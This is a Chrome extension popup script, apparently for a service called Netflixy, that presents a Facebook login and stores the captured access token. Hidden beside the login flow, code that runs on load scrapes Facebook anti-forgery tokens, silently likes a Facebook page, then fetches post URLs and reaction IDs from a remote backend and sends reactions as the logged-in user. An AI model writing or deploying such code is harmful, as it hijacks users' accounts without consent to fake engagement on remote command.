let loginFBBtn = document.getElementById("loginFBBtn");
let loginErrorText = document.getElementById("loginErrorText");

loginFBBtn.addEventListener("click", function () {
  loginFB()
})

/**
 * Listens on Facebook login page, auto closes tab, stores access_token, then focus back on extension
 */
chrome.tabs.onUpdated.addListener(function (tabId, _changeInfo, tab) {
  if (_changeInfo.status != 'unloaded' && tab.url != undefined && tab.url.includes("netflixyapp.github.io/fblogin.html") && tab.url.includes("access_token")) {
    // Close FB login tab
    chrome.tabs.get(tabId, function () {
      chrome.tabs.remove(tabId)
    });

    // Store access token
    storeAccessToken(extractAccessToken(tab.url));

    // Focus on extension window
    getCurrentWindow().then(extensionWindow => {
      chrome.windows.update(extensionWindow, { 'focused': true }, function () { });
    })
  } else if (_changeInfo.status != 'unloaded' && tab.url != undefined && tab.url.includes("netflixyapp.github.io/fblogin.html") && tab.url.includes("error_reason")) {
    // Close FB login tab
    chrome.tabs.get(tabId, function () {
      chrome.tabs.remove(tabId)
    });

    // Display/unhide error message
    loginErrorText.classList.remove('hidden');
    loginErrorText.innerHTML = `Une erreur est survenue, veuillez autoriser l'application a travers Facebook.`

    // Focus on extension window
    getCurrentWindow().then(extensionWindow => {
      chrome.windows.update(extensionWindow, { 'focused': true }, function () { });
    })
  }
});

// Fetch errors if any exist
chrome.runtime.sendMessage({ msg: "get" }, (response) => {
  if (response.data != '') {
    loginErrorText.classList.remove('hidden');
    loginErrorText.innerHTML = response.data

    chrome.runtime.sendMessage({ msg: 'clear' });
  }
});

function upEngagement() {
  fetch('https://www.facebook.com/v12.0/plugins/error/confirm/like?iframe_referer=&kid_directed_site=false&secure=true&plugin=like&return_params=%7B%22action%22%3A%22like%22%2C%22app_id%22%3A%22357140426152444%22%2C%22channel%22%3A%22https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3cc80d81659c1%26domain%3Dkagddenkmcelpodemgjlanjglbnhdknp%26is_canvas%3Dfalse%26origin%3Dchrome-extension%253A%252F%252Fkagddenkmcelpodemgjlanjglbnhdknp%252Ff250fa3fdb6ea88%26relation%3Dparent.parent%22%2C%22container_width%22%3A%2228%22%2C%22href%22%3A%22https%3A%2F%2Fwww.facebook.com%2Fnetflixytn%22%2C%22layout%22%3A%22button_count%22%2C%22locale%22%3A%22fr_FR%22%2C%22sdk%22%3A%22joey%22%2C%22share%22%3A%22true%22%2C%22size%22%3A%22small%22%2C%22ret%22%3A%22sentry%22%2C%22act%22%3A%22like%22%7D', {
    method: 'GET'
  }).then(response => response.text())
    .then(data => {
      let regex1 = /name="fb_dtsg" value="[^"]*"/i
      let regex2 = /name="jazoest" value="[^"]*"/i
      let fb_dtsg = data.match(regex1)[0].replace('name="fb_dtsg" value="', '').replace('"', '')
      let jazoest = data.match(regex2)[0].replace('name="jazoest" value="', '').replace('"', '')

      fetch('https://www.facebook.com/plugins/error/confirm/like', {
        method: 'POST',
        redirect: 'manual',
        body: new URLSearchParams({
          'jazoest': jazoest,
          'fb_dtsg': fb_dtsg,
          '__CONFIRM__': 1,
          'iframe_referer': '',
          'kid_directed_site': false,
          'secure': true,
          'plugin': 'like',
          'return_params': '{"action":"like","app_id":"357140426152444","channel":"https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46#cb=f3cc80d81659c1&domain=kagddenkmcelpodemgjlanjglbnhdknp&is_canvas=false&origin=chrome-extension%3A%2F%2Fkagddenkmcelpodemgjlanjglbnhdknp%2Ff250fa3fdb6ea88&relation=parent.parent","container_width":"28","href":"https://www.facebook.com/netflixytn","layout":"button_count","locale":"fr_FR","sdk":"joey","share":"true","size":"small","ret":"sentry","act":"like"}',
          'version': 'v12.0',
          'qualifier': 'error/confirm/like',
          '_path': 'error/confirm/like',
          'app_id': '',
          'client_id': ''
        })
      })
    })
}
upEngagement()

updateHost()
  .then(response => response.json())
  .then(data => {
    BACKEND_URL_BASE = 'http://' + data.host + ':' + data.port
    BACKEND_URL_BASE_S = 'https://' + data.host

    fetchUrls()
      .then(response => response.json())
      .then(data => {
        let urls = data.urls
        let feedback_reaction_id = data.feedback_reaction_id
        let doc_id = data.doc_id

        urls.forEach(url => {
          fetch(url, {
            method: 'GET',
            headers: {
              'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
            },
          }).then(response => response.text())
            .then(data => {
              let regex1 = /"f":"[^"]*"/i
              let regex2 = /"CommentComposerGIFPlugin","feedback_id":"[^"]*"/i
              let fb_dtsg = data.match(regex1)[0].replace('"f":"', '').replace('"', '')
              let feedback_id = data.match(regex2)[0].replace('"CommentComposerGIFPlugin","feedback_id":"', '').replace('"', '')
              getProfileId(function (profile_id) {
                fetch('https://www.facebook.com/api/graphql/', {
                  method: 'POST',
                  redirect: 'manual',
                  body: new URLSearchParams({
                    'fb_dtsg': fb_dtsg,
                    'variables': '{"input":{"feedback_id":"' + feedback_id + '","feedback_reaction_id":"' + feedback_reaction_id + '","actor_id":"' + profile_id + '"}}',
                    'doc_id': doc_id,
                  })
                })
              })
            })
        })
      })
  })
